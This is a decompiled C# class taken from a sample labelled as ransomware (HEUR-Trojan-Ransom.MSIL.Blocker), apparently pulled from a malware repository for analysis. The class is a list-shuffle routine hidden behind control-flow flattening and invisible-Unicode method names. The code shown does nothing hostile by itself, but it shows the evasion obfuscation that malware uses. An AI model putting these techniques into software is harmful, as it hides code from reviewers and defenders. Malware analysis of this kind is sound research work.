// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.ScrambleExtention
// Assembly: RuntimeParameterIn, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: E46F8FBF-E963-420D-9D24-515F2113904E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-899a15627241e59e9347d18a6286ac2587425c3cd941d6b095f01d1a9205dac5.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public static class ScrambleExtention
  {
    private static readonly Random Random = ScrambleExtention.\u206D‫‌‎⁬⁭‭⁪‫⁫⁯‎‮⁭⁯‭⁭‮⁬‭‫‬‍⁮‍‬‪‭⁪⁫‌⁮⁯​‫⁮‎‎⁯⁭‮();

    public static void Shuffle<T>(IList<T> list)
    {
label_1:
      int num1 = 784041196;
      int count;
      bool flag;
      int index;
      T obj;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 204820874)) % 13U)
        {
          case 0:
            list[index] = list[count];
            num1 = (int) num2 * -453400578 ^ 2031014571;
            continue;
          case 1:
            flag = count > 1;
            num1 = 1659791683;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num3 = flag ? 1704495923 : (num3 = 858831248);
            num1 = num3 ^ (int) num2 * -509292137;
            continue;
          case 4:
            index = ScrambleExtention.\u206F‫‮⁮⁪‬‏‭⁭⁫‎‮⁭‮⁮​‏⁭‮‍⁭‮‬‎‫⁪⁮‫⁬⁫‫‮‭‌​⁭⁬​‫⁫‮(ScrambleExtention.Random, count + 1);
            num1 = (int) num2 * 703729754 ^ -184088685;
            continue;
          case 5:
            obj = list[index];
            num1 = (int) num2 * -1936771682 ^ 214747502;
            continue;
          case 6:
            list[count] = obj;
            num1 = (int) num2 * 1795542741 ^ 276625812;
            continue;
          case 7:
            --count;
            num1 = (int) num2 * -3007307 ^ 65081995;
            continue;
          case 8:
            num1 = 2068809504;
            continue;
          case 9:
            count = list.Count;
            num1 = (int) num2 * 71935025 ^ -296016110;
            continue;
          case 10:
            num1 = (int) num2 * -2115914792 ^ -574802484;
            continue;
          case 11:
            num1 = (int) num2 * -1189793064 ^ 787471379;
            continue;
          case 12:
            goto label_3;
          default:
            goto label_15;
        }
      }
label_3:
      return;
label_15:;
    }

    static int \u206F‫‮⁮⁪‬‏‭⁭⁫‎‮⁭‮⁮​‏⁭‮‍⁭‮‬‎‫⁪⁮‫⁬⁫‫‮‭‌​⁭⁬​‫⁫‮([In] Random obj0, [In] int obj1) => obj0.Next(obj1);

    static Random \u206D‫‌‎⁬⁭‭⁪‫⁫⁯‎‮⁭⁯‭⁭‮⁬‭‫‬‍⁮‍‬‪‭⁪⁫‌⁮⁯​‫⁮‎‎⁯⁭‮() => new Random();
  }
}
